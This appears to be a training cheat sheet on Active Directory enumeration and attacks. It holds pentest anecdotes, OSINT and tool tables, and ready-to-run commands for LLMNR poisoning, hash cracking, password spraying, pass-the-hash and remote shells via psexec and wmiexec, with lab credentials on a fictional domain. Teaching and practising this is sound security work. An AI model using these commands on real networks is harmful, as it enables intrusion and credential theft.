

![](https://i.imgur.com/vaiWTm2.png)

# Active Directory Enumeration & Attacks

`Active Directory` (`AD`) is a directory service for Windows enterprise environments that was officially implemented in 2000 with the release of Windows Server 2000 and has been incrementally improved upon with the release of each subsequent server OS since. AD is based on the protocols x.500 and LDAP that came before it and still utilizes these protocols in some form today. It is a distributed, hierarchical structure that allows for centralized management of an organization’s resources, including users, computers, groups, network devices and file shares, group policies, devices, and trusts. AD provides `authentication, accounting, and authorization` functions within a Windows enterprise environment.


**Scenario 1 - Waiting On An Admin**

During this engagement, I compromised a single host and gained `SYSTEM` level access. Because this was a domain-joined host, I was able to use this access to enumerate the domain. I went through all of the standard enumeration, but did not find much. There were `Service Principal Names` (SPNs) present within the environment, and I was able to perform a Kerberoasting attack and retrieve TGS tickets for a few accounts. I attempted to crack these with Hashcat and some of my standard wordlists and rules, but was unsuccessful at first. I ended up leaving a cracking job running overnight with a very large wordlist combined with the [d3ad0ne](https://github.com/hashcat/hashcat/blob/master/rules/d3ad0ne.rule) rule that ships with Hashcat. The next morning I had a hit on one ticket and retrieved the cleartext password for a user account. This account did not give me significant access, but it did give me write access on certain file shares. I used this access to drop SCF files around the shares and left Responder going. After a while, I got a single hit, the `NetNTLMv2 hash` of a user. I checked through the BloodHound output and noticed that this user was actually a domain admin! Easy day from here.

---

**Scenario 2 - Spraying The Night Away**

Password spraying can be an extremely effective way to gain a foothold in a domain, but we must exercise great care not to lock out user accounts in the process. On one engagement, I found an SMB NULL session using the [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) tool and retrieved both a listing of `all` users from the domain, and the domain `password policy`. Knowing the password policy was crucial because I could ensure that I was staying within the parameters to not lock out any accounts and also knew that the policy was a minimum eight-character password and password complexity was enforced (meaning that a user's password required 3/4 of special character, number, uppercase, or lower case number, i.e., Welcome1). I tried several common weak passwords such as Welcome1, `Password1`, Password123, `Spring2018`, etc. but did not get any hits. Finally, I made an attempt with `Spring@18` and got a hit! Using this account, I ran BloodHound and found several hosts where this user had local admin access. I noticed that a domain admin account had an active session on one of these hosts. I was able to use the Rubeus tool and extract the Kerberos TGT ticket for this domain user. From there, I was able to perform a `pass-the-ticket` attack and authenticate as this domain admin user. As a bonus, I was able to take over the trusting domain as well because the Domain Administrators group for the domain that I took over was a part of the Administrators group in the trusting domain via nested group membership, meaning I could use the same set of credentials to authenticate to the other domain with full administrative level access.

- - -

**Scenario 3 - Fighting In The Dark**

I had tried all of my standard ways to obtain a foothold on this third engagement, and nothing had worked. I decided that I would use the [Kerbrute](https://github.com/ropnop/kerbrute) tool to attempt to enumerate valid usernames and then, if I found any, attempt a targeted password spraying attack since I did not know the password policy and didn't want to lock any accounts out. I used the [linkedin2username](https://github.com/initstring/linkedin2username) tool to first mashup potential usernames from the company's LinkedIn page. I combined this list with several username lists from the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo and, after using the `userenum` feature of Kerbrute, ended up with **516** valid users. I knew I had to tread carefully with password spraying, so I tried with the password `Welcome2021` and got a single hit! Using this account, I ran the Python version of BloodHound from my attack host and found that all domain users had RDP access to a single box. I logged into this host and used the PowerShell tool [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) to spray again. I was more confident this time around because I could a) view the password policy and b) the DomainPasswordSpray tool will remove accounts close to lockout from the target list. Being that I was authenticated within the domain, I could now spray with all domain users, which gave me significantly more targets. I tried again with the common password Fall2021 and got several hits, all for users not in my initial wordlist. I checked the rights for each of these accounts and found that one was in the Help Desk group, which had [GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall) rights over the [Enterprise Key Admins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#enterprise-key-admins) group. The Enterprise Key Admins group had GenericAll privileges over a domain controller, so I added the account I controlled to this group, authenticated again, and inherited these privileges. Using these rights, I performed the [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) attack and retrieved the NT hash for the domain controller machine account. With this NT hash, I was then able to perform a DCSync attack and retrieve the NTLM password hashes for all users in the domain because a domain controller can perform replication, which is required for DCSync.

## What Are We Looking For?
The table below highlights the "`What`" in what we would be searching for during this phase of our engagement.

| **Data Point**       | **Description**                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| -------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `IP Space`           | Valid ASN for our target, netblocks in use for the organization's public-facing infrastructure, cloud presence and the hosting providers, DNS record entries, etc.                                                                                                                                                                                                                                                                              |
| `Domain Information` | Based on IP data, DNS, and site registrations. Who administers the domain? Are there any subdomains tied to our target? Are there any publicly accessible domain services present? (Mailservers, DNS, Websites, VPN portals, etc.) Can we determine what kind of defenses are in place? (SIEM, AV, IPS/IDS in use, etc.)                                                                                                                        |
| `Schema Format`      | Can we discover the organization's email accounts, AD usernames, and even password policies? Anything that will give us information we can use to build a valid username list to test external-facing services for password spraying, credential stuffing, brute forcing, etc.                                                                                                                                                                  |
| `Data Disclosures`   | For data disclosures we will be looking for publicly accessible files ( .pdf, .ppt, .docx, .xlsx, etc. ) for any information that helps shed light on the target. For example, any published files that contain `intranet` site listings, user metadata, shares, or other critical software or hardware in the environment (credentials pushed to a public GitHub repo, the internal AD username format in the metadata of a PDF, for example.) |
| `Breach Data`        | Any publicly released usernames, passwords, or other critical information that can help an attacker gain a foothold.                                                                                                                                                                                                                                                                                                                            |

## Where Are We Looking?

| **Resource**                     | **Examples**                                                                                                                                                                                                                                                                                                                                                                                                                             |
| -------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ASN / IP registrars`            | [IANA](https://www.iana.org/), [arin](https://www.arin.net/) for searching the Americas, [RIPE](https://www.ripe.net/) for searching in Europe, [BGP Toolkit](https://bgp.he.net/)                                                                                                                                                                                                                                                       |
| `Domain Registrars & DNS`        | [Domaintools](https://www.domaintools.com/), [PTRArchive](http://ptrarchive.com/), [ICANN](https://lookup.icann.org/lookup), manual DNS record requests against the domain in question or against well known DNS servers, such as `8.8.8.8`.                                                                                                                                                                                             |
| `Social Media`                   | Searching Linkedin, Twitter, Facebook, your region's major social media sites, news articles, and any relevant info you can find about the organization.                                                                                                                                                                                                                                                                                 |
| `Public-Facing Company Websites` | Often, the public website for a corporation will have relevant info embedded. News articles, embedded documents, and the "About Us" and "Contact Us" pages can also be gold mines.                                                                                                                                                                                                                                                       |
| `Cloud & Dev Storage Spaces`     | [GitHub](https://github.com/), [AWS S3 buckets & Azure Blog storage containers](https://grayhatwarfare.com/), [Google searches using "Dorks"](https://www.exploit-db.com/google-hacking-database)                                                                                                                                                                                                                                        |
| `Breach Data Sources`            | [HaveIBeenPwned](https://haveibeenpwned.com/) to determine if any corporate email accounts appear in public breach data, [Dehashed](https://www.dehashed.com/) to search for corporate emails with cleartext passwords or hashes we can try to crack offline. We can then try these passwords against any exposed login portals (Citrix, RDS, OWA, 0365, VPN, VMware Horizon, custom applications, etc.) that may use AD authentication. |

## Tools

| Tool                                                                                                                                          | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| --------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)/[SharpView](https://github.com/dmchell/SharpView) | A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows `net*` commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting. |
| [BloodHound](https://github.com/BloodHoundAD/BloodHound)                                                                                      | Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a [Neo4j](https://neo4j.com/) database for graphical analysis of the AD environment.                                                                                                                                                                                             |
| [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)                                                               | The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.                                                                                                                                                                                                                                                                                                       |
| [BloodHound.py](https://github.com/fox-it/BloodHound.py)                                                                                      | A Python-based BloodHound ingestor based on the [Impacket toolkit](https://github.com/CoreSecurity/impacket/). It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis.                                                                                                                                                                                                                                                                                                                      |
| [Kerbrute](https://github.com/ropnop/kerbrute)                                                                                                | A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing.                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| [Impacket toolkit](https://github.com/SecureAuthCorp/impacket)                                                                                | A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.                                                                                                                                                                                                                                                                                                                                                                                                                              |
| [Responder](https://github.com/lgandx/Responder)                                                                                              | Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| [Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1)                                                             | Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| [C# Inveigh (InveighZero)](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh)                                                    | The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes.                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [rpcinfo](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo)                                           | The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The "-p" option is used to specify the target host. For example the command "rpcinfo -p 10.0.0.1" will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges.                                                                                                                                                             |
| [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)                                                               | A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| [CrackMapExec (CME)](https://github.com/byt3bl33d3r/CrackMapExec)                                                                             | CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL.                                                                                                                                                                                                                                                                                                                                  |
| [Rubeus](https://github.com/GhostPack/Rubeus)                                                                                                 | Rubeus is a C# tool built for Kerberos Abuse.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)                                              | Another Impacket module geared towards finding Service Principal names tied to normal users.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| [Hashcat](https://hashcat.net/hashcat/)                                                                                                       | A great hash cracking and password recovery tool.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| [enum4linux](https://github.com/CiscoCXSecurity/enum4linux)                                                                                   | A tool for enumerating information from Windows and Samba systems.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)                                                                                       | A rework of the original Enum4linux tool that works a bit differently.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| [ldapsearch](https://linux.die.net/man/1/ldapsearch)                                                                                          | Built-in interface for interacting with the LDAP protocol.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| [windapsearch](https://github.com/ropnop/windapsearch)                                                                                        | A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| [DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray)                                                                    | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)                                                                                      | The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).                                                                                                                                                                                                                                                                                                                                                                                              |
| [smbmap](https://github.com/ShawnDEvans/smbmap)                                                                                               | SMB share enumeration across a domain.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)                                                        | Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)                                                      | Part of the Impacket toolkit, it provides the capability of command execution over WMI.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| [Snaffler](https://github.com/SnaffCon/Snaffler)                                                                                              | Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)                                                  | Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| [setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11))             | Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| [Mimikatz](https://github.com/ParrotSec/mimikatz)                                                                                             | Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host.                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)                                              | Remotely dump SAM and LSA secrets from a host.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| [evil-winrm](https://github.com/Hackplayers/evil-winrm)                                                                                       | Provides us with an interactive shell on a host over the WinRM protocol.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)                                              | Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| [noPac.py](https://github.com/Ridter/noPac)                                                                                                   | Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [rpcdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py)                                                      | Part of the Impacket toolset, RPC endpoint mapper.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| [CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py)                                                       | Printnightmare PoC in python.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)                                                | Part of the Impacket toolset, it performs SMB relay attacks.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| [PetitPotam.py](https://github.com/topotam/PetitPotam)                                                                                        | PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)                                                        | Tool for manipulating certificates and TGTs.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py)                                                              | This tool will use an existing TGT to request a PAC for the current user using U2U.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| [adidnsdump](https://github.com/dirkjanm/adidnsdump)                                                                                          | A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)                                                                                        | Extracts usernames and passwords from Group Policy preferences files.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)                                                | Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking.                                                                                                                                                                                                                                                                                                                             |
| [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py)                                                  | SID bruteforcing tool.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)                                                    | A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)                                                | Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| [Active Directory Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)                                               | Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.                                                                                                                                                   |
| [PingCastle](https://www.pingcastle.com/documentation/)                                                                                       | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on [CMMI](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) adapted to AD security).                                                                                                                                                                                                                                                                                                                                                                               |
| [Group3r](https://github.com/Group3r/Group3r)                                                                                                 | Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| [ADRecon](https://github.com/adrecon/ADRecon)                                                                                                 | A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.                                                                                                                                                                                                                                                                                                                                                              |

## Commands
### Initial Enumeration

|Command|Description|
|---|---|
|`nslookup ns1.inlanefreight.com`|Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host.|
|`sudo tcpdump -i ens224`|Used to start capturing network packets on the network interface proceeding the `-i` option a Linux-based host.|
|`sudo responder -I ens224 -A`|Used to start responding to & analyzing `LLMNR`, `NBT-NS` and `MDNS` queries on the interface specified proceeding the `-I` option and operating in `Passive Analysis` mode which is activated using `-A`. Performed from a Linux-based host|
|`fping -asgq 172.16.5.0/23`|Performs a ping sweep on the specified network segment from a Linux-based host.|
|`sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum`|Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (`-A`) based on a list of hosts (`hosts.txt`) specified in the file proceeding `-iL`. Then outputs the scan results to the file specified after the `-oN`option. Performed from a Linux-based host|
|`sudo git clone https://github.com/ropnop/kerbrute.git`|Uses `git` to clone the kerbrute tool from a Linux-based host.|
|`make help`|Used to list compiling options that are possible with `make` from a Linux-based host.|
|`sudo make all`|Used to compile a `Kerbrute` binary for multiple OS platforms and CPU architectures.|
|`./kerbrute_linux_amd64`|Used to test the chosen complied `Kebrute` binary from a Linux-based host.|
|`sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute`|Used to move the `Kerbrute` binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool.|
|`./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results`|Runs the Kerbrute tool to discover usernames in the domain (`INLANEFREIGHT.LOCAL`) specified proceeding the `-d` option and the associated domain controller specified proceeding `--dc`using a wordlist and outputs (`-o`) the results to a specified file. Performed from a Linux-based host.|

### LLMNR/NTB-NS Poisoning

|Command|Description|
|---|---|
|`responder -h`|Used to display the usage instructions and various options available in `Responder` from a Linux-based host.|
|`hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt`|Uses `hashcat` to crack `NTLMv2` (`-m`) hashes that were captured by responder and saved in a file (`frond_ntlmv2`). The cracking is done based on a specified wordlist.|
|`Import-Module .\Inveigh.ps1`|Using the `Import-Module` PowerShell cmd-let to import the Windows-based tool `Inveigh.ps1`.|
|`(Get-Command Invoke-Inveigh).Parameters`|Used to output many of the options & functionality available with `Invoke-Inveigh`. Peformed from a Windows-based host.|
|`Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`|Starts `Inveigh` on a Windows-based host with LLMNR & NBNS spoofing enabled and outputs the results to a file.|
|`.\Inveigh.exe`|Starts the `C#` implementation of `Inveigh` from a Windows-based host.|
|`$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \|foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}`|PowerShell script used to disable NBT-NS on a Windows host.|

### Password Spraying & Password Policies

|Command|Description|
|---|---|
|`#!/bin/bash for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}} do echo $x; done`|Bash script used to generate `16,079,616` possible username combinations from a Linux-based host.|
|`crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol`|Uses `CrackMapExec`and valid credentials (`avazquez:Password123`) to enumerate the password policy (`--pass-pol`) from a Linux-based host.|
|`rpcclient -U "" -N 172.16.5.5`|Uses `rpcclient` to discover information about the domain through `SMB NULL` sessions. Performed from a Linux-based host.|
|`rpcclient $> querydominfo`|Uses `rpcclient` to enumerate the password policy in a target Windows domain from a Linux-based host.|
|`enum4linux -P 172.16.5.5`|Uses `enum4linux` to enumerate the password policy (`-P`) in a target Windows domain from a Linux-based host.|
|`enum4linux-ng -P 172.16.5.5 -oA ilfreight`|Uses `enum4linux-ng` to enumerate the password policy (`-P`) in a target Windows domain from a Linux-based host, then presents the output in YAML & JSON saved in a file proceeding the `-oA` option.|
|`ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" \| grep -m 1 -B 10 pwdHistoryLength`|Uses `ldapsearch` to enumerate the password policy in a target Windows domain from a Linux-based host.|
|`net accounts`|Used to enumerate the password policy in a Windows domain from a Windows-based host.|
|`Import-Module .\PowerView.ps1`|Uses the Import-Module cmd-let to import the `PowerView.ps1` tool from a Windows-based host.|
|`Get-DomainPolicy`|Used to enumerate the password policy in a target Windows domain from a Windows-based host.|
|`enum4linux -U 172.16.5.5 \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"`|Uses `enum4linux` to discover user accounts in a target Windows domain, then leverages `grep` to filter the output to just display the user from a Linux-based host.|
|`rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser`|Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.|
|`crackmapexec smb 172.16.5.5 --users`|Uses `CrackMapExec` to discover users (`--users`) in a target Windows domain from a Linux-based host.|
|`ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" \| grep sAMAccountName: \| cut -f2 -d" "`|Uses `ldapsearch` to discover users in a target Windows doman, then filters the output using `grep` to show only the `sAMAccountName` from a Linux-based host.|
|`./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`|Uses the python tool `windapsearch.py` to discover users in a target Windows domain from a Linux-based host.|
|`for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done`|Bash one-liner used to perform a password spraying attack using `rpcclient` and a list of users (`valid_users.txt`) from a Linux-based host. It also filters out failed attempts to make the output cleaner.|
|`kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1`|Uses `kerbrute` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host.|
|`sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +`|Uses `CrackMapExec` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using `grep`.|
|`sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`|Uses `CrackMapExec` to validate a set of credentials from a Linux-based host.|
|`sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +`|Uses `CrackMapExec` and the -`-local-auth` flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using `grep`.|
|`Import-Module .\DomainPasswordSpray.ps1`|Used to import the PowerShell-based tool `DomainPasswordSpray.ps1` from a Windows-based host.|
|`Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue`|Performs a password spraying attack and outputs (-OutFile) the results to a specified file (`spray_success`) from a Windows-based host.|

### Enumerating Security Controls

|Command|Description|
|---|---|
|`Get-MpComputerStatus`|PowerShell cmd-let used to check the status of `Windows Defender Anti-Virus` from a Windows-based host.|
|`Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections`|PowerShell cmd-let used to view `AppLocker` policies from a Windows-based host.|
|`$ExecutionContext.SessionState.LanguageMode`|PowerShell script used to discover the `PowerShell Language Mode` being used on a Windows-based host. Performed from a Windows-based host.|
|`Find-LAPSDelegatedGroups`|A `LAPSToolkit` function that discovers `LAPS Delegated Groups` from a Windows-based host.|
|`Find-AdmPwdExtendedRights`|A `LAPSTookit` function that checks the rights on each computer with LAPS enabled for any groups with read access and users with `All Extended Rights`. Performed from a Windows-based host.|
|`Get-LAPSComputers`|A `LAPSToolkit` function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.|

### Credentialed Enumeration

|Command|Description|
|---|---|
|`xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25`|Connects to a Windows target using valid credentials. Performed from a Linux-based host.|
|`sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users`|Authenticates with a Windows target over `smb` using valid credentials and attempts to discover more users (`--users`) in a target Windows domain. Performed from a Linux-based host.|
|`sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups`|Authenticates with a Windows target over `smb` using valid credentials and attempts to discover groups (`--groups`) in a target Windows domain. Performed from a Linux-based host.|
|`sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users`|Authenticates with a Windows target over `smb` using valid credentials and attempts to check for a list of logged on users (`--loggedon-users`) on the target Windows host. Performed from a Linux-based host.|
|`sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares`|Authenticates with a Windows target over `smb` using valid credentials and attempts to discover any smb shares (`--shares`). Performed from a Linux-based host.|
|`sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share`|Authenticates with a Windows target over `smb` using valid credentials and utilizes the CrackMapExec module (`-M`) `spider_plus` to go through each readable share (`Dev-share`) and list all readable files. The results are outputted in `JSON`. Performed from a Linux-based host.|
|`smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5`|Enumerates the target Windows domain using valid credentials and lists shares & permissions available on each within the context of the valid credentials used and the target Windows host (`-H`). Performed from a Linux-based host.|
|`smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only`|Enumerates the target Windows domain using valid credentials and performs a recursive listing (`-R`) of the specified share (`SYSVOL`) and only outputs a list of directories (`--dir-only`) in the share. Performed from a Linux-based host.|
|`rpcclient $> queryuser 0x457`|Enumerates a target user account in a Windows domain using its relative identifier (`0x457`). Performed from a Linux-based host.|
|`rpcclient $> enumdomusers`|Discovers user accounts in a target Windows domain and their associated relative identifiers (`rid`). Performed from a Linux-based host.|
|`psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125`|Impacket tool used to connect to the `CLI` of a Windows target via the `ADMIN$` administrative share with valid credentials. Performed from a Linux-based host.|
|`wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5`|Impacket tool used to connect to the `CLI` of a Windows target via `WMI` with valid credentials. Performed from a Linux-based host.|
|`windapsearch.py -h`|Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host.|
|`python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 --da`|Used to enumerate the domain admins group (`--da`) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host.|
